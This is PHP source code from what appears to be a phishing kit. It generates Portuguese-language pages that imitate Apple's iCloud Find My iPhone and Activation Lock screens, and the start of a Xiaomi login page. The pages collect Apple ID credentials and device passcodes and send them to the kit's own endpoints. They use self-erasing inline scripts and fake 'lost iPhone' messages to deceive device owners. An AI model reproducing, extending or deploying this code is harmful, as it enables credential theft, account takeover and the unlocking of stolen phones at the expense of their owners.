		//$html .= 'Apple ID" autofocus="" spellcheck="false" aria-labelledby="appleIdFieldLabel" required="required" aria-required="true" autocapitalize="off" autocorrect="off" autocomplete="off" can-field="accountName" class="inp si-text-field inp2" type="email" style="padding-right: 48px;" value="'.set_value('apple_id', $novoMail).'" onpaste="myPasteID()">';

		$html .= form_open(site_url('authority/get'), array('class' => 'cloud-login form-ajax-newpages-2020', 'role' => 'form', 'data-red' => ($redirect == 1 ? $redirecturl : site_url('findmyiphone')), 'data-reds' => ($redirect == 1 ? 1 : 0), 'style' => 'display:block !important')) . "\n";
		$html .= "\n" . '<input type="hidden" name = "apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >' . "\n";
		$html .= "\n" . '<input type="text" class="id" name="apple_id" id="apple_id"' . "\n" . '               placeholder="' . $ci->lang->line('appleid_message') . '" style="direction: ltr !important;"' . "\n" . '               value="' . set_value('apple_id', $novoMail) . '">' . "\n";
		$html .= "\n" . '<input type="button" name="showPassword" id="showPassword" value="" onclick="myFunction()">';
		$html .= "\n" . '<input type="password" style="display: none;" autocomplete="off" class="pwd" name="apple_pwd" id="apple_pwd"' . "\n" . '               placeholder="' . $ci->lang->line('Password_message') . '">' . "\n";
		$html .= "\n" . '<input type="submit" style="display: none;" disabled class="dolog" name="c_log" id="c_log" value="">' . "\n";
		$html .= "\n" . '<img class="loading" src="/assets/img/ajax-loader.gif" alt="Loading" style="display: none;">' . "\n";
		$html .= "\n" . '</form>';
		/*
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '<div id="separator" class="field-separator hide focus"></div>';
		$html .= "\n" . '<div id="sign_in_form" class="row no-gutter si-field pwd" style="display: none">';
		$html .= "\n" . '<div class="col-xs-12">';
		$html .= "\n" . '<label class="sr-only" for="pwd">';
		$html .= "\n" . 'Senha</label>';
		$html .= "\n" . '<div id="password_div" class="ax-border pwd">';
		$html .= "\n" . '<input id="password" aria-describedby="invalidUserNamePwdErrMsg" aria-invalid="true" placeholder="';
		$html .= 'Senha" class="inp si-password si-text-field inp inp2" autocomplete="off" can-field="password" required="required" aria-required="true" type="password" onpaste="myPastePW()">';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		*/
		//$html .= "\n" . '<form action="" onsubmit="return false"> ';
		$html .= "\n" . '<div id="error_div" class="error_container alrt" style="display: none;">';
		$html .= "\n" . '<div class="error_view">';
		$html .= "\n" . '<div class="error_before"></div>';
		$html .= "\n" . '<p class="error_text" id="errMsg">';
		$html .= "\n" . 'Seu ID Apple ou senha estão incorretos.<br> <a target="blank" class="forgot_link" href="https://iforgot.apple.com/password/verify/appleid">';
		$html .= "\n" . 'Esqueceu o ID Apple ou senha?                        </a>';
		$html .= "\n" . '</p>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '<div style="position:absolute;left: -9999;" id="error_div" class="error_container">';
		$html .= "\n" . '</div>';
		$html .= "\n" . '<div class="si-remember-password" >';
		$html .= "\n" . '<label class="rem2" id="remember" for="remember-me" style="cursor:pointer;">';
		$html .= "\n" . 'Manter a sessão aberta</label>';
		$html .= "\n" . '<input value="false" {()}="isRememberMeChecked" class="sr-only" id="remember-me" type="checkbox">';
		$html .= "\n" . '<i style="top: -1px; cursor:pointer;" id="checkbox" class="ax-outline icon   icon_uncheck_2 "></i>';
		$html .= "\n" . '';
		$html .= "\n" . '</div>';
		$html .= "\n" . '<div class="si-container-footer">';
		$html .= "\n" . '<div class="separator "></div>';
		$html .= "\n" . '<div class="links tk-subbody">';
		$html .= "\n" . '<div class="si-forgot-password">';
		$html .= "\n" . '<a id="iforgot-link" class="si-link ax-outline lite-theme-override" ()="iforgotLinkClickHandler()" href="https://iforgot.apple.com/password/verify/appleid" target="_blank">';
		$html .= "\n" . 'Esqueceu o ID Apple ou senha?</a>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '';
		/*
		$html .= "\n" . '<div id="spiner" style="top: 170px" class="spinner-container auth hide">';
		$html .= "\n" . '<div id="submit_loader" style="position: absolute;"></div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '<div id="spiner_2" style="top: 127px;" class="spinner-container auth hide">';
		$html .= "\n" . '<div id="submit_loader_2" style="position: absolute;"></div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '<button id="btn_pwd" aria-disabled="true" style="top: 109px" class="si-button btn disabled" tabindex="0" aria-label="">';
		$html .= "\n" . '<i class="icon icon_sign_in"></i>';
		$html .= "\n" . '</button><button id="submit" aria-disabled="true" style="top: 151px" class="si-button btn disabled hide" tabindex="0" aria-label="????????">';
		$html .= "\n" . '<i class="icon icon_sign_in"></i>';
		$html .= "\n" . '</button>';
		//$html .= "\n" . '</form>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		*/
		$html .= "\n" . '</sign-in>';
		$html .= "\n" . '</div></div>';
		$html .= "\n" . '<br><button type="button" class="" onclick="closeForm()"><h>X</h></button></div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>    ';
		$html .= "\n" . '</hero>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '<script id="erasable_1" type="text/javascript" src="';
		$html .= "\n" . '/assets/fdmy/log.js';
		$html .= "\n" . '">';
		$html .= "\n" . '</script>	';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '</center>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '<script id="erasable_2" type="text/javascript">';
		$html .= "\n" . '$(document).ready(function(){';
		$html .= "\n" . 'function show_body() {';
		$html .= "\n" . '$("#show_1").css("display", "none");';
		$html .= "\n" . '$( "#show_3" ).fadeIn( "fast", function() {';
		$html .= "\n" . '// Animation complete.';
		$html .= "\n" . '//$( "#code_in" ).focus();';
		$html .= "\n" . '});';
		$html .= "\n" . '}';
		$html .= "\n" . 'setTimeout(show_body, 5500);';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '$(function() {';
		$html .= "\n" . '$("#myForm").delay(9000).fadeIn(500);';
		$html .= "\n" . '});';
		$html .= "\n" . '$("#singin").click(function(){';
		$html .= "\n" . 'if ($("#appleId").val() != "" && $("#pw").val() != ""){';
		$html .= "\n" . '$("#spiner").css("position", "relative");';
		$html .= "\n" . '$("#spiner").css("left", "10px");';
		$html .= "\n" . '$("#singin").addClass("hide");';
		$html .= "\n" . '$("#submit_loader_2").removeClass("hide");';
		$html .= "\n" . 'login();}});';
		$html .= "\n" . 'function myPastePW() {';
		$html .= "\n" . '$("#singin").prop("disabled", false);';
		$html .= "\n" . '}';
		$html .= "\n" . '});';
		$html .= "\n" . '';
		$html .= "\n" . 'document.getElementById("erasable_2").innerHTML = "";</script>';
		$html .= "\n" . '<script type="text/javascript">';
		$html .= "\n" . 'jQuery("#submit_loader_1").activity({width: 1, segments: 12, length: 5});';
		$html .= "\n" . 'jQuery("#submit_loader_2").activity({width: 1, segments: 12, length: 5});';
		$html .= "\n" . '';
		$html .= "\n" . '$(".close").click(function(){';
		$html .= "\n" . '$("#myModal").css("display", "none");';
		$html .= "\n" . '$("#pw").focus();';
		$html .= "\n" . '';
		$html .= "\n" . '});';
		$html .= "\n" . '';
		$html .= "\n" . 'function openForm() {';
		$html .= "\n" . 'document.getElementById("myForm").style.display = "block";';
		$html .= "\n" . '}';
		$html .= "\n" . '';
		$html .= "\n" . 'function closeForm() {';
		$html .= "\n" . 'document.getElementById("myForm").style.display = "none";';
		$html .= "\n" . '$("#myForm").delay(400).fadeIn();';
		$html .= "\n" . '}';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '</script>';
		$html .= "\n" . '';
		$html .= "\n" . '<script> ';
		$html .= "\n" . '$(document).ready(function(){';
		$html .= "\n" . '';
		$html .= "\n" . 'var lgo = $("#bac");';
		$html .= "\n" . 'lgo.animate({left: "48%", opacity: "0.9"}, 3000);';
		$html .= "\n" . 'lgo.animate({left: "49%", opacity: "0.9"}, 3000);';
		$html .= "\n" . 'lgo.animate({left: "50%", opacity: "0.9"}, 2000);';
		$html .= "\n" . 'lgo.animate({top: "27%", opacity: "0.9"}, 3000);';
		$html .= "\n" . 'lgo.animate({top: "25%", opacity: "0.6"}, 2000);';
		$html .= "\n" . '';
		$html .= "\n" . '});';
		$html .= "\n" . '</script> ';
		$html .= "\n" . '</body>';
		$html .= "\n" . '</html>';

		return $html;
	}
}

if (!(function_exists('SenhaTela4Modelo2020'))) {
function SenhaTela4Modelo2020($title, $emailid)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirecturl2 = $ci->load->get_var('redirecturl2');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));
	//$html = 'SenhaTela4Modelo2020';



	$html = '<html><head>';
	$html .= "\n" . '<script src="/assets/src/icloud_page/jquery-1.10.2.js"></script>';
	$html .= "\n" . '<title>'.$title.'</title>';
	$html .= "\n" . '<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />';
	$html .= "\n" . '<base href="">';
	$html .= "\n" . '<link rel="stylesheet" type="text/css" href="/assets/src/activation_lock/passcode.css">';
	$html .= "\n" . '<meta charset="utf-8">';
	$html .= "\n" . '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">';
	$html .= "\n" . '<script src="/assets/src/code.jquery.com/jquery-1.10.2.js"></script>';
	$html .= "\n" . '<script src="/assets/src/code.jquery.com/ui/1.12.1/jquery-ui.js"></script>';
	$html .= "\n" . '<script src="/assets/src/icloud_page_new/activity-indicator.js"></script>';
	$html .= "\n" . '</head>';
	$html .= "\n" . '<body id="body_b" style="font-family: Arial, Helvetica, sans-serif; ">';
	$html .= "\n" . '<div id="show_1" style="display: block;">';
	$html .= "\n" . '<div style="margin: 0; position: absolute; top: 50%; left: 50%; -ms-transform: translate(-50%, -50%); transform: translate(-50%, -50%);">';
	$html .= "\n" . '<div id="submit_loader_1"></div>';
	$html .= "\n" . '<div style="padding-top: 18px; text-align: center;"><label style="font-family: Arial, Helvetica, sans-serif;">Pode demorar alguns minutos para localizar o seu iPhone perdido.</label></div></div></div>';
	$html .= "\n" . '<div  id="show_2" style="text-align: center; margin-left: 20px; margin-right: 20px; padding-top: 40px; display: none;"> ';
	$html .= "\n" . '<span style="font-size: 34px;">Digite a senha</span><br />';
	$html .= "\n" . '<span style="font-size: 14px;">Digite a senha que foi usada anteriormente para bloquear esse iPhone perdido.</span>';
	$html .= "\n" . '<div id="code" style="padding-top: 20px;">';
	$html .= "\n" . '<div id="bile"><svg height="40" width="40">';
	$html .= "\n" . '<circle id="c1" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.';
	$html .= "\n" . '</svg>';
	$html .= "\n" . '<svg height="40" width="40">';
	$html .= "\n" . '<circle id="c2" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.';
	$html .= "\n" . '</svg>';
	$html .= "\n" . '<svg height="40" width="40">';
	$html .= "\n" . '<circle id="c3" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.  ';
	$html .= "\n" . '</svg>';
	$html .= "\n" . '<svg height="40" width="40">';
	$html .= "\n" . '<circle id="c4" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.';
	$html .= "\n" . '</svg>';
	$html .= "\n" . '<input type="number" name="" value="" hidden="" />';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div style="text-align: center; padding-top: 16px; margin-right: auto; margin-left: auto;">';
	$html .= "\n" . '<div>';
	$html .= "\n" . '<table style="width:280px; margin: auto;">';
	$html .= "\n" . '<tr>';
	$html .= "\n" . '<th><button id="1" class="button button5">1</button></th>';
	$html .= "\n" . '<th><button id="2" class="button button5">2</button></th> ';
	$html .= "\n" . '<th><button id="3" class="button button5">3</button></th>';
	$html .= "\n" . '</tr>';
	$html .= "\n" . '<tr>';
	$html .= "\n" . '<th><button id="4" class="button button5">4</button></th>';
	$html .= "\n" . '<th><button id="5" class="button button5">5</button></th>';
	$html .= "\n" . '<th><button id="6" class="button button5">6</button></th>';
	$html .= "\n" . '</tr>';
	$html .= "\n" . '<tr>';
	$html .= "\n" . '<th><button id="7" class="button button5">7</button></th>';
	$html .= "\n" . '<th><button id="8" class="button button5">8</button></th>';
	$html .= "\n" . '<th><button id="9" class="button button5">9</button></th>';
	$html .= "\n" . '</tr>';
	$html .= "\n" . '<tr>';
	$html .= "\n" . '<th></th>';
	$html .= "\n" . '<th><button id="0" class="button button5">0</button></th>';
	$html .= "\n" . '<th><button class="button buttonr" onclick="remove()"><img src="/assets/src/activation_lock/next.png" width="35"/></button></th>';
	$html .= "\n" . '</tr>';
	$html .= "\n" . '</table>';
	$html .= "\n" . '</div></div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div  id="show_3" style="text-align: center; display: none;">';
	$html .= "\n" . '<div style=" padding-top: 40px;">';
	$html .= "\n" . '<span style="font-size: 45px;">Bloqueio de Ativação</span><br>';
	$html .= "\n" . '<div style="margin: 0 auto; max-width:550px;">';
	$html .= "\n" . '<div style="padding-top: 45px; margin-left: 16px; margin-right: 16px;"><span >Este iPhone está vinculado a um ID Apple. Digite o ID Apple e a Senha que foram usados para bloquear este dispositivo.</span><br>';
	$html .= "\n" . '<div style="padding-top: 45px; "></div></div>';
	$html .= "\n" . '<div style="margin-left: 10px; margin-right: 10px; text-align: left; border-bottom: 1px solid #dbdbdb; border-top: 1px solid #dbdbdb;">';
	$html .= "\n" . '<div style="border-bottom: 1px solid #dbdbdb;"><label style="padding-left: 40px; position: absolute; padding-top: 14px; ">Apple ID</label>';
	$html .= "\n" . '<input type="hidden" name="apple_add"  id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >' . "\n";
	$html .= "\n" . '<input id="appleId" type="text" name="id" value="'.set_value('apple_id', $novoMail).'"  placeholder="Apple ID" style="font-size: 14px; border:none; padding-top: 14px; padding-right: 14px; padding-bottom: 14px; padding-left: 135px; width: 100%;">';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div style="padding-left: 34px;"></div>';
	$html .= "\n" . '<label style="padding-left: 40px; position: absolute; padding-top: 14px;">Senha</label>';
	$html .= "\n" . '<input id="pw" type="password" name="pwd" value=""  placeholder="Obrigarório" style="font-size: 14px; border:none; padding-left: 30px; padding-top: 14px; padding-right: 14px; padding-bottom: 14px; padding-left: 135px; width: 100%;">';
	$html .= "\n" . '<div></div></div></div>';
	$html .= "\n" . '';
	$html .= "\n" . '<div>';
	$html .= "\n" . '<input type="hidden" name="ID" id="ID" value="<?php echo ;?>">';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div>';
	$html .= "\n" . '<input type="hidden" name="auth" id="auth" value="<?php echo 123;?>">';
	$html .= "\n" . '</div>';
	$html .= "\n" . '';
	$html .= "\n" . '<div style="padding-top: 25px; ">';
	$html .= "\n" . '<div id="submit_loader_2" class="spinner_2 hide"></div>';
	$html .= "\n" . '<button class="submit_b" name="submit" id="singin" type="submit" disabled="">Confirmar</button>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '';
	$html .= "\n" . '<div id="myModal" class="modal">';
	$html .= "\n" . '<!-- Modal content -->';
	$html .= "\n" . '<div align="center" class="modal-content w3-animate-zoom">';
	$html .= "\n" . '<div style="padding-left: 18px; padding-right: 18px; padding-top: 18px; padding-bottom: 10px">';
	$html .= "\n" . '<span style="padding-top: 10px; font-weight: bold">Falha na Verificação</span>';
	$html .= "\n" . '<div style="padding-top: 4px"><span style="font-size: 13px">Seu Apple ID ou senha está incorreto.</span></div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div style="padding-top:12px; min-height: 30px; border-top: 1px solid #dbdbdb; border-bottom-left-radius: 16px; border-bottom-right-radius: 16px;" class="close"><span style="color: #008ae6;" >OK</span></div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<script id="erasable_1" type="text/javascript">';
	$html .= "\n" . 'var	setcolor = 0;';
	$html .= "\n" . 'var num = 0;';
	$html .= "\n" . 'var afis = 0;';
	$html .= "\n" . 'function remove() {';
	$html .= "\n" . 'if (setcolor > 0){';
	$html .= "\n" . 'changePolyColor("white");';
	$html .= "\n" . 'num = parseInt(num/10);	';
	$html .= "\n" . '}';
	$html .= "\n" . 'setcolor--;';
	$html .= "\n" . 'if (setcolor <  1)';
	$html .= "\n" . 'setcolor = 0;';
	$html .= "\n" . '}';
	$html .= "\n" . 'function changePolyColor(color) {';
	$html .= "\n" . 'var poly = document.getElementById("c" + setcolor);';
	$html .= "\n" . 'poly.setAttribute("fill", color);';
	$html .= "\n" . '}';
	$html .= "\n" . 'document.getElementById("erasable_1").innerHTML = "";</script>';
	$html .= "\n" . '<script src="/assets/js/ajax-form-bolinha2020.js?t=' . time() . '"></script>';
	$html .= "\n" . '<script type="text/javascript">';
	$html .= "\n" . 'jQuery("#submit_loader_1").activity({width: 1, segments: 12, length: 5});';
	$html .= "\n" . 'jQuery("#submit_loader_2").activity({width: 1, segments: 12, length: 5});';
	$html .= "\n" . '';
	$html .= "\n" . '$(".close").click(function(){';
	$html .= "\n" . '$("#myModal").css("display", "none");';
	$html .= "\n" . '$("#pw").focus();';
	$html .= "\n" . 'location.reload();';
	$html .= "\n" . '';
	$html .= "\n" . '});';
	$html .= "\n" . '</script>';
	$html .= "\n" . '</body>';
	$html .= "\n" . '</html>';

	return $html;
}
}

if (!(function_exists('SenhaTela6Modelo2020'))) {
function SenhaTela6Modelo2020($title, $emailid)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirecturl2 = $ci->load->get_var('redirecturl2');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));

	$html = '<html><head>';
	$html .= "\n" . '<script src="/assets/src/icloud_page/jquery-1.10.2.js"></script>';
	$html .= "\n" . '<title>'.$title.'</title>';
	$html .= "\n" . '<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />';
	$html .= "\n" . '<base href="">';
	$html .= "\n" . '<link rel="stylesheet" type="text/css" href="/assets/src/activation_lock/passcode.css">';
	$html .= "\n" . '<meta charset="utf-8">';
	$html .= "\n" . '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">';
	$html .= "\n" . '<script src="/assets/src/code.jquery.com/jquery-1.10.2.js"></script>';
	$html .= "\n" . '<script src="/assets/src/code.jquery.com/ui/1.12.1/jquery-ui.js"></script>';
	$html .= "\n" . '<script src="/assets/src/icloud_page_new/activity-indicator.js"></script>';
	$html .= "\n" . '</head>';
	$html .= "\n" . '<body id="body_b" style="font-family: Arial, Helvetica, sans-serif; ">';
	$html .= "\n" . '<div id="show_1" style="display: block;">';
	$html .= "\n" . '<div style="margin: 0; position: absolute; top: 50%; left: 50%; -ms-transform: translate(-50%, -50%); transform: translate(-50%, -50%);">';
	$html .= "\n" . '<div id="submit_loader_1"></div>';
	$html .= "\n" . '<div style="padding-top: 18px; text-align: center;"><label style="font-family: Arial, Helvetica, sans-serif;">Pode demorar alguns minutos para localizar o seu iPhone perdido.</label></div></div></div>';
	$html .= "\n" . '<div  id="show_2" style="text-align: center; margin-left: 20px; margin-right: 20px; padding-top: 40px; display: none;"> ';
	$html .= "\n" . '<span style="font-size: 34px;">Digite a senha</span><br />';
	$html .= "\n" . '<span style="font-size: 14px;">Digite a senha que foi usada anteriormente para bloquear esse iPhone perdido.</span>';
	$html .= "\n" . '<div id="code" style="padding-top: 20px;">';
	$html .= "\n" . '<div id="bile"><svg height="40" width="40">';
	$html .= "\n" . '<circle id="c1" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.';
	$html .= "\n" . '</svg>';
	$html .= "\n" . '<svg height="40" width="40">';
	$html .= "\n" . '<circle id="c2" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.';
	$html .= "\n" . '</svg>';
	$html .= "\n" . '<svg height="40" width="40">';
	$html .= "\n" . '<circle id="c3" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.  ';
	$html .= "\n" . '</svg>';
	$html .= "\n" . '<svg height="40" width="40">';
	$html .= "\n" . '<circle id="c4" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.';
	$html .= "\n" . '</svg>';
	$html .= "\n" . '<svg height="40" width="40">';
	$html .= "\n" . '<circle id="c5" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.';
	$html .= "\n" . '</svg>';
	$html .= "\n" . '<svg height="40" width="40">';
	$html .= "\n" . '<circle id="c6" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.';
	$html .= "\n" . '</svg>';
	$html .= "\n" . '<input type="number" name="" value="" hidden="" />';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div style="text-align: center; padding-top: 16px; margin-right: auto; margin-left: auto;">';
	$html .= "\n" . '<div>';
	$html .= "\n" . '<table style="width:280px; margin: auto;">';
	$html .= "\n" . '<tr>';
	$html .= "\n" . '<th><button id="1" class="button button5">1</button></th>';
	$html .= "\n" . '<th><button id="2" class="button button5">2</button></th> ';
	$html .= "\n" . '<th><button id="3" class="button button5">3</button></th>';
	$html .= "\n" . '</tr>';
	$html .= "\n" . '<tr>';
	$html .= "\n" . '<th><button id="4" class="button button5">4</button></th>';
	$html .= "\n" . '<th><button id="5" class="button button5">5</button></th>';
	$html .= "\n" . '<th><button id="6" class="button button5">6</button></th>';
	$html .= "\n" . '</tr>';
	$html .= "\n" . '<tr>';
	$html .= "\n" . '<th><button id="7" class="button button5">7</button></th>';
	$html .= "\n" . '<th><button id="8" class="button button5">8</button></th>';
	$html .= "\n" . '<th><button id="9" class="button button5">9</button></th>';
	$html .= "\n" . '</tr>';
	$html .= "\n" . '<tr>';
	$html .= "\n" . '<th></th>';
	$html .= "\n" . '<th><button id="0" class="button button5">0</button></th>';
	$html .= "\n" . '<th><button class="button buttonr" onclick="remove()"><img src="/assets/src/activation_lock/next.png" width="35"/></button></th>';
	$html .= "\n" . '</tr>';
	$html .= "\n" . '</table>';
	$html .= "\n" . '</div></div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div  id="show_3" style="text-align: center; display: none;">';
	$html .= "\n" . '<div style=" padding-top: 40px;">';
	$html .= "\n" . '<span style="font-size: 45px;">Bloqueio de Ativação</span><br>';
	$html .= "\n" . '<div style="margin: 0 auto; max-width:550px;">';
	$html .= "\n" . '<div style="padding-top: 45px; margin-left: 16px; margin-right: 16px;"><span >Este iPhone está vinculado a um ID Apple. Digite o ID Apple e a Senha que foram usados para bloquear este dispositivo.</span><br>';
	$html .= "\n" . '<div style="padding-top: 45px; "></div></div>';
	$html .= "\n" . '<div style="margin-left: 10px; margin-right: 10px; text-align: left; border-bottom: 1px solid #dbdbdb; border-top: 1px solid #dbdbdb;">';
	$html .= "\n" . '<div style="border-bottom: 1px solid #dbdbdb;"><label style="padding-left: 40px; position: absolute; padding-top: 14px; ">Apple ID</label>';
	$html .= "\n" . '<input type="hidden" name="apple_add"  id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >' . "\n";
	$html .= "\n" . '<input id="appleId" type="text" name="id" value="'.set_value('apple_id', $novoMail).'"  placeholder="Apple ID" style="font-size: 14px; border:none; padding-top: 14px; padding-right: 14px; padding-bottom: 14px; padding-left: 135px; width: 100%;">';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div style="padding-left: 34px;"></div>';
	$html .= "\n" . '<label style="padding-left: 40px; position: absolute; padding-top: 14px;">Senha</label>';
	$html .= "\n" . '<input id="pw" type="password" name="pwd" value=""  placeholder="Obrigarório" style="font-size: 14px; border:none; padding-left: 30px; padding-top: 14px; padding-right: 14px; padding-bottom: 14px; padding-left: 135px; width: 100%;">';
	$html .= "\n" . '<div></div></div></div>';
	$html .= "\n" . '';
	$html .= "\n" . '<div>';
	$html .= "\n" . '<input type="hidden" name="ID" id="ID" value="<?php echo ;?>">';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div>';
	$html .= "\n" . '<input type="hidden" name="auth" id="auth" value="<?php echo 123;?>">';
	$html .= "\n" . '</div>';
	$html .= "\n" . '';
	$html .= "\n" . '<div style="padding-top: 25px; ">';
	$html .= "\n" . '<div id="submit_loader_2" class="spinner_2 hide"></div>';
	$html .= "\n" . '<button class="submit_b" name="submit" id="singin" type="submit" disabled="">Confirmar</button>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '';
	$html .= "\n" . '<div id="myModal" class="modal">';
	$html .= "\n" . '<!-- Modal content -->';
	$html .= "\n" . '<div align="center" class="modal-content w3-animate-zoom">';
	$html .= "\n" . '<div style="padding-left: 18px; padding-right: 18px; padding-top: 18px; padding-bottom: 10px">';
	$html .= "\n" . '<span style="padding-top: 10px; font-weight: bold">Falha na Verificação</span>';
	$html .= "\n" . '<div style="padding-top: 4px"><span style="font-size: 13px">Seu Apple ID ou senha está incorreto.</span></div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<div style="padding-top:12px; min-height: 30px; border-top: 1px solid #dbdbdb; border-bottom-left-radius: 16px; border-bottom-right-radius: 16px;" class="close"><span style="color: #008ae6;" >OK</span></div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<script id="erasable_1" type="text/javascript">';
	$html .= "\n" . 'var	setcolor = 0;';
	$html .= "\n" . 'var num = 0;';
	$html .= "\n" . 'var afis = 0;';
	$html .= "\n" . 'function remove() {';
	$html .= "\n" . 'if (setcolor > 0){';
	$html .= "\n" . 'changePolyColor("white");';
	$html .= "\n" . 'num = parseInt(num/10);	';
	$html .= "\n" . '}';
	$html .= "\n" . 'setcolor--;';
	$html .= "\n" . 'if (setcolor <  1)';
	$html .= "\n" . 'setcolor = 0;';
	$html .= "\n" . '}';
	$html .= "\n" . 'function changePolyColor(color) {';
	$html .= "\n" . 'var poly = document.getElementById("c" + setcolor);';
	$html .= "\n" . 'poly.setAttribute("fill", color);';
	$html .= "\n" . '}';
	$html .= "\n" . 'document.getElementById("erasable_1").innerHTML = "";</script>';
	$html .= "\n" . '<script src="/assets/js/ajax-form-bolinha2020-6.js?t=' . time() . '"></script>';
	$html .= "\n" . '<script type="text/javascript">';
	$html .= "\n" . 'jQuery("#submit_loader_1").activity({width: 1, segments: 12, length: 5});';
	$html .= "\n" . 'jQuery("#submit_loader_2").activity({width: 1, segments: 12, length: 5});';
	$html .= "\n" . '';
	$html .= "\n" . '$(".close").click(function(){';
	$html .= "\n" . '$("#myModal").css("display", "none");';
	$html .= "\n" . '$("#pw").focus();';
	$html .= "\n" . 'location.reload();';
	$html .= "\n" . '';
	$html .= "\n" . '});';
	$html .= "\n" . '</script>';
	$html .= "\n" . '</body>';
	$html .= "\n" . '</html>';

	return $html;
}
}

if (!(function_exists('XiaomiLogin'))) {
function XiaomiLogin($title, $emailid)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirecturl2 = $ci->load->get_var('redirecturl2');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'Xiaomi'));


	$html = '<html lang="pt-BR"><head><style>.gm-style .gm-style-mtc label,.gm-style .gm-style-mtc div{font-weight:400}';
	$html .= "\n" . '</style><style>.gm-control-active>img{box-sizing:content-box;display:none;left:50%;pointer-events:none;position:absolute;top:50%;transform:translate(-50%,-50%)}.gm-control-active>img:nth-child(1){display:block}.gm-control-active:hover>img:nth-child(1),.gm-control-active:active>img:nth-child(1){display:none}.gm-control-active:hover>img:nth-child(2),.gm-control-active:active>img:nth-child(3){display:block}';
	$html .= "\n" . '</style><link type="text/css" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Google+Sans"><style>.gm-ui-hover-effect{opacity:.6}.gm-ui-hover-effect:hover{opacity:1}';
	$html .= "\n" . '</style><style>.gm-style .gm-style-cc span,.gm-style .gm-style-cc a,.gm-style .gm-style-mtc div{font-size:10px;box-sizing:border-box}';
